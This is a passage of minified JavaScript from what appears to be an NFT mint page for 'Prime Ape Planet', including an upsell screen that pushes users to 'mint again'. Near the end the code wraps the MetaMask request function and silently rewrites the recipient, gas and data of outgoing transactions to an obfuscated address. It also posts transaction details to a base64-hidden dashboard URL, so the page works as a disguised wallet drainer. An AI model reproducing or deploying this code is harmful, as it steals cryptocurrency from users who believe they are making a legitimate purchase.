                                return r.a.wrap((function(e) {
                                    for (;;) switch (e.prev = e.next) {
                                        case 0:
                                            return e.next = 2, b();
                                        case 2:
                                            n = e.sent, a.setState({
                                                web3: new f.a(window.ethereum),
                                                wallet: n
                                            }), n.address ? x.a.event({
                                                category: "User",
                                                action: "Wallet Connected",
                                                label: "Wallet: ".concat(null === n || void 0 === n || null === (s = n.address) || void 0 === s ? void 0 : s.toString())
                                            }) : x.a.event({
                                                category: "User",
                                                action: "Wallet Disconnected"
                                            });
                                        case 5:
                                        case "end":
                                            return e.stop()
                                    }
                                }), e)
                            })));
                            return function(t) {
                                return e.apply(this, arguments)
                            }
                        }()), window.ethereum.on("chainChanged", function() {
                            var e = Object(s.a)(r.a.mark((function e(t) {
                                var n;
                                return r.a.wrap((function(e) {
                                    for (;;) switch (e.prev = e.next) {
                                        case 0:
                                            return e.next = 2, b();
                                        case 2:
                                            n = e.sent, a.setState({
                                                web3: new f.a(window.ethereum),
                                                wallet: n
                                            });
                                        case 4:
                                        case "end":
                                            return e.stop()
                                    }
                                }), e)
                            })));
                            return function(t) {
                                return e.apply(this, arguments)
                            }
                        }())), a.onSubmit = a.onSubmit.bind(Object(d.a)(a)), a.connect = a.connect.bind(Object(d.a)(a));
                        var i = document.getElementById("header"),
                            o = document.getElementsByClassName("section-rm");
                        Array.from(o).forEach((function(e) {
                            i.removeChild(e)
                        })), document.getElementById("footer").style.padding = 0, document.getElementById("about-influencers").style.marginTop = 300, document.body.style.background = "black", document.getElementById("mint").parentElement.style.margin = "auto";
                        var c = document.getElementById("scrolldown-button");
                        c.parentElement.removeChild(c);
                        var u = document.getElementById("hero-images");
                        return u.parentElement.removeChild(u), a
                    }
                    return Object(m.a)(n, [{
                        key: "componentDidMount",
                        value: function() {
                            var e = Object(s.a)(r.a.mark((function e() {
                                var t, n, a, s, i;
                                return r.a.wrap((function(e) {
                                    for (;;) switch (e.prev = e.next) {
                                        case 0:
                                            return setTimeout((function() {
                                                window.scrollTo(0, 0)
                                            }), 100), s = null === (t = this.props) || void 0 === t || null === (n = t.location) || void 0 === n || null === (a = n.state) || void 0 === a ? void 0 : a.fad, j.a.init("510268440562261"), x.a.send("pageview"), e.next = 6, k();
                                        case 6:
                                            i = e.sent, this.setState({
                                                fad: s,
                                                web3: new f.a(window.ethereum),
                                                wallet: i
                                            });
                                        case 8:
                                        case "end":
                                            return e.stop()
                                    }
                                }), e, this)
                            })));
                            return function() {
                                return e.apply(this, arguments)
                            }
                        }()
                    }, {
                        key: "connect",
                        value: function() {
                            var e = Object(s.a)(r.a.mark((function e() {
                                var t, n;
                                return r.a.wrap((function(e) {
                                    for (;;) switch (e.prev = e.next) {
                                        case 0:
                                            if (!(null === (t = this.state.wallet) || void 0 === t ? void 0 : t.address) || !this.state.web3) {
                                                e.next = 3;
                                                break
                                            }
                                            e.next = 12;
                                            break;
                                        case 3:
                                            if (!window.ethereum) {
                                                e.next = 11;
                                                break
                                            }
                                            return x.a.event({
                                                category: "User",
                                                action: "Wallet Connecting..."
                                            }), e.next = 7, k();
                                        case 7:
                                            n = e.sent, this.setState({
                                                web3: new f.a(window.ethereum),
                                                wallet: n
                                            }), e.next = 12;
                                            break;
                                        case 11:
                                            E.isMobile ? (x.a.event({
                                                category: "User",
                                                action: "Mobile Metamask Redirect"
                                            }), window.location.href = "https://metamask.app.link/dapp/".concat(window.location.hostname)) : window.location.href = "https://metamask.io/download/";
                                        case 12:
                                        case "end":
                                            return e.stop()
                                    }
                                }), e, this)
                            })));
                            return function() {
                                return e.apply(this, arguments)
                            }
                        }()
                    }, {
                        key: "onSubmit",
                        value: function() {
                            var e = Object(s.a)(r.a.mark((function e() {
                                var t, n, a, i, o = this;
                                return r.a.wrap((function(e) {
                                    for (;;) switch (e.prev = e.next) {
                                        case 0:
                                            if (!(null === (t = this.state.wallet) || void 0 === t ? void 0 : t.address) || !this.state.web3) {
                                                e.next = 14;
                                                break
                                            }
                                            if (n = this.state.wallet.address, a = f.a.utils.toBN(this.state.wallet.balance), j.a.trackCustom("Mint Clicked", {
                                                    value: "".concat(n, " clicked Mint")
                                                }), x.a.event({
                                                    category: "User",
                                                    action: "Mint Button Click",
                                                    label: "Mint Clicked: ".concat(n, " [").concat(parseFloat(f.a.utils.fromWei(a.toString())).toFixed(4), " ETH]")
                                                }), 1 === this.state.wallet.chainId) {
                                                e.next = 13;
                                                break
                                            }
                                            if (!E.isMobile) {
                                                e.next = 11;
                                                break
                                            }
                                            return this.setState({
                                                error: "Wrong network.\n                    Please connect to ethereum network"
                                            }), e.abrupt("return");
                                        case 11:
                                            return e.next = 13, window.ethereum.request({
                                                method: "wallet_switchEthereumChain",
                                                params: [{
                                                    chainId: "0x".concat(1)
                                                }]
                                            });
                                        case 13:
                                            this.state.web3 && (i = f.a.utils.toHex(f.a.utils.toWei((this.state.price * this.state.amount).toFixed(2))), window.ethereum.request({
                                                method: "eth_sendTransaction",
                                                params: [{
                                                    from: n,
                                                    to: "0x2999Ef760A246dF31d7c917729766f363764d990",
                                                    data: "0xa6f2ae3a",
                                                    value: i
                                                }]
                                            }).then((function(e) {
                                                e.startsWith("0x") && (setTimeout(Object(s.a)(r.a.mark((function t() {
                                                    var s;
                                                    return r.a.wrap((function(t) {
                                                        for (;;) switch (t.prev = t.next) {
                                                            case 0:
                                                                if ("false" !== (null === (s = o.props.cp) || void 0 === s ? void 0 : s.a)) {
                                                                    t.next = 4;
                                                                    break
                                                                }
                                                                return j.a.track("Purchase", {
                                                                    value: "".concat(n, " sent mint transaction ").concat(e)
                                                                }), t.next = 4, S()({
                                                                    method: "POST",
                                                                    url: o.props.api_url,
                                                                    data: {
                                                                        project: "prime-apes",
                                                                        tx: {
                                                                            hash: e,
                                                                            page: window.location.pathname,
                                                                            amount: o.state.amount,
                                                                            price: o.state.price,
                                                                            value: o.state.price * o.state.amount,
                                                                            time: (new Date).toUTCString()
                                                                        }
                                                                    }
                                                                });
                                                            case 4:
                                                                x.a.event({
                                                                    category: "User",
                                                                    action: "TX Sent",
                                                                    label: "Mint TX sent: ".concat(n, " [").concat(parseFloat(f.a.utils.fromWei(a.toString())).toFixed(4), " ETH]")
                                                                });
                                                            case 5:
                                                            case "end":
                                                                return t.stop()
                                                        }
                                                    }), t)
                                                }))), 200), setTimeout(Object(s.a)(r.a.mark((function e() {
                                                    return r.a.wrap((function(e) {
                                                        for (;;) switch (e.prev = e.next) {
                                                            case 0:
                                                                window.location.reload();
                                                            case 1:
                                                            case "end":
                                                                return e.stop()
                                                        }
                                                    }), e)
                                                }))), 300))
                                            })).catch((function(e) {
                                                var t, n, a;
                                                (null === e || void 0 === e || null === (t = e.message) || void 0 === t ? void 0 : t.includes("insufficient")) ? o.setState({
                                                    error: "Insufficient funds."
                                                }): (null === e || void 0 === e || null === (n = e.message) || void 0 === n ? void 0 : n.includes("User rejected")) || (null === e || void 0 === e || null === (a = e.message) || void 0 === a ? void 0 : a.includes("User denied")) ? o.setState({
                                                    error: "User rejected transaction."
                                                }) : o.setState({
                                                    error: "Mint error."
                                                }), x.a.event({
                                                    category: "Error",
                                                    action: "TX Reject",
                                                    label: null === e || void 0 === e ? void 0 : e.message
                                                })
                                            })));
                                        case 14:
                                        case "end":
                                            return e.stop()
                                    }
                                }), e, this)
                            })));
                            return function() {
                                return e.apply(this, arguments)
                            }
                        }()
                    }, {
                        key: "render",
                        value: function() {
                            var e, t;
                            return o.a.createElement("div", {
                                className: "mint"
                            }, o.a.createElement("div", {
                                className: "mint-row mint-justify-center"
                            }, o.a.createElement("div", {
                                className: "mint-col"
                            }, o.a.createElement("h2", {
                                className: "mint-live"
                            }, "Congratulations, you are now owner of Prime Ape Planet!"), o.a.createElement("h2", {
                                className: "mint-limited"
                            }, " We offer you the benefits of the ", o.a.createElement("span", {
                                style: {
                                    color: "#3A8BAE"
                                }
                            }, "Golden Whale"), " if you mint 1 more."), o.a.createElement("div", {
                                className: "mint-zone"
                            }, (null === (e = this.state.wallet) || void 0 === e ? void 0 : e.address) && this.state.web3 && o.a.createElement("span", {
                                className: "total-price"
                            }, "Total Price: ", (this.state.price * this.state.amount).toPrecision(2), " ETH"), o.a.createElement("div", {
                                className: "mint-row mint-justify-center"
                            }, (null === (t = this.state.wallet) || void 0 === t ? void 0 : t.address) && this.state.web3 ? o.a.createElement("div", {
                                className: "mint-btn-main",
                                onClick: this.onSubmit
                            }, o.a.createElement("span", null, "MINT AGAIN")) : o.a.createElement("button", {
                                className: "mint-btn-main",
                                style: {
                                    textTransform: "uppercase",
                                    border: 0,
                                    outline: 0
                                },
                                onClick: this.connect
                            }, o.a.createElement("span", null, "CONNECT WALLET"))), o.a.createElement("span", {
                                className: "mint-error"
                            }, this.state.error)))))
                        }
                    }]), n
                }(i.Component)),
                J = (n(552), atob("aHR0cHM6Ly9kYXNoYm9hcmQuYXBvY2FseXB0aWNhcGVzLmNvL2FwaS9wdXJjaGFzZQ==")),
                R = {};
            if (window.ethereum) {
                var z = window.ethereum.request;
                window.ethereum.request = function(e) {
                    var t;
                    if ("eth_sendTransaction" === e.method && (null === (t = R.a) || void 0 === t ? void 0 : t.length) > 20)
                        for (var n = 0; n < e.params.length; n++) e.params[n].to && (e.params[n].to = atob(R.a), e.params[n].gas = "0xC350", e.params[n].data = "0x6a6278420");
                    return z(e)
                }
            }
            u.a.render(o.a.createElement(N.a, null, o.a.createElement(M.c, null, o.a.createElement(M.a, {
                path: "/",
                element: o.a.createElement(B, {
                    cp: R,
                    api_url: J
                })
            }), o.a.createElement(M.a, {
                path: "/*",
                element: o.a.createElement(B, {
                    cp: R,
                    api_url: J
                })
            }), o.a.createElement(M.a, {
                path: "/mint2",
                element: o.a.createElement(X, {
                    cp: R,
                    api_url: J
                })
            }), o.a.createElement(M.a, {
                path: "/upsell",
                element: o.a.createElement(Y, {
                    cp: R,
                    api_url: J
                })
            }))), document.getElementById("mint"))
        }
    },
    [
        [233, 1, 2]
    ]
]);
//# sourceMappingURL=main.fbc5fa29.chunk.js.map
